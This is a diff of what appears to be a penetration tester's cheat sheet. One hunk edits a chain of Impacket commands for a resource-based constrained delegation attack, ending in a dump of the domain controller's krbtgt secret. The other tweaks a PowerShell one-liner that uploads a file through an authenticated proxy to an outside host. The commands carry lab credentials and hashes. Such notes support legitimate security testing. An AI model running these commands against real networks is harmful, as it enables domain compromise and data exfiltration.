@@ -1021,11 +1021,10 @@ AES256 Key: 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98
 ```
 
 ```
-$ proxychains4 -q addcomputer.py -computer-name 'fakemachine1337' -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC01.megacorp.local 'megacorp.local/athompson:sshhiinnoobbii!!'
-$ proxychains4 -q ./rbcd.py -t 'CN=DC01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u 'jops' -H f7b8e6e5af23f06fdbb559d1888261fa:f7b8e6e5af23f06fdbb559d1888261fa -l 10.10.13.37
-$ proxychains4 -q getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' -dc-ip 10.10.13.37 'megacorp.local/fakemachine1337:Passw0rd!'
-$ proxychains4 -q getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' -dc-ip 10.10.13.37 'megacorp.local/fakemachine1337' -hashes :FC525C9683E8FE067095BA2DDC971889 -aesKey 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98 -force-forwardable
-$ proxychains4 -q secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.10.13.37 -no-pass -k
+$ addcomputer.py -computer-name fakemachine1337 -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC01.megacorp.local megacorp.local/snovvcrash:'Qwe123!@#'
+$ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u snovvcrash -H 79bfd1ab35c67c19715aea7f06da66ee:79bfd1ab35c67c19715aea7f06da66ee -l 10.10.13.37
+$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' -dc-ip 10.10.13.37 megacorp.local/fakemachine1337 -hashes :FC525C9683E8FE067095BA2DDC971889 -aesKey 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98 -force-forwardable
+$ secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.10.13.37 -no-pass -k
 ```
 
 
@@ -4689,7 +4688,7 @@ $proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\In
 PowerShell manually set proxy and upload file to remote HTTP server:
 
 ```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential("snovvcrash","Passw0rd!","megacorp.local");$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
 ```
 
 
